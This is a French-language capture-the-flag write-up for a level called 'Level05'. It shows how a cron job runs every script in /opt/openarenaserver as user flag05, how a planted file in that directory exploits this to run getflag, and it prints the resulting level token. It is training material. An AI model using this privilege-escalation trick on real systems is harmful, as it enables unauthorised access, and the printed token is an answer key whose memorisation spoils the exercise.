# Level05

Dans ce niveau, nous cherchons les privilèges du compte flag05. Nous commençons par rechercher des fichiers appartenant à l'utilisateur flag05 avec la commande suivante :

```bash
find / -user flag05 2> /dev/null
```

Cela nous donne deux résultats :
- /usr/sbin/openarenaserver
- /rofs/usr/sbin/openarenaserver
Nous examinons ensuite le contenu du fichier ```/usr/sbin/openarenaserver``` avec la commande cat pour comprendre ce qu'il fait. Le contenu du fichier est le suivant :

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Ce script parcourt tous les fichiers dans le répertoire /opt/openarenaserver et les exécute en limitant leur temps d'exécution à 5 secondes. Ensuite, il supprime ces fichiers.

Notre objectif est d'exploiter cette configuration pour obtenir des privilèges supplémentaires. Nous allons créer un fichier shell malveillant qui exécute la commande getflag pour récupérer le jeton du niveau suivant :

```bash
openarenaserver
/usr/sbin/openarenaserver: Permission denied
```

on va regarder les privilege de Level05
```bash
find / -name level05 2> /dev/null

/var/mail/level05
/rofs/var/mail/level05

cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le script /usr/sbin/openarenaserver parcourt tous les fichiers dans le répertoire /opt/openarenaserver et les exécute avec un délai de 5 secondes (ulimit -t 5). Ensuite, il supprime ces fichiers.

Notre objectif est d'exploiter cette configuration pour obtenir des privilèges supplémentaires:

Créez un fichier shell malveillant qui exécute la commande getflag pour récupérer le jeton du niveau suivant.
```sh
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
```

Ce fichier malveillant sera exécuté lors de la prochaine itération du script /usr/sbin/openarenaserver.

Ensuite, nous attendons que le job cron programmé s'exécute et crée le fichier ```/tmp/flag05```, qui contiendra le jeton du niveau suivant. Une fois que le job cron s'est exécuté, nous lisons le contenu du fichier ```/tmp/flag05``` pour obtenir le jeton :
```bash
cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```


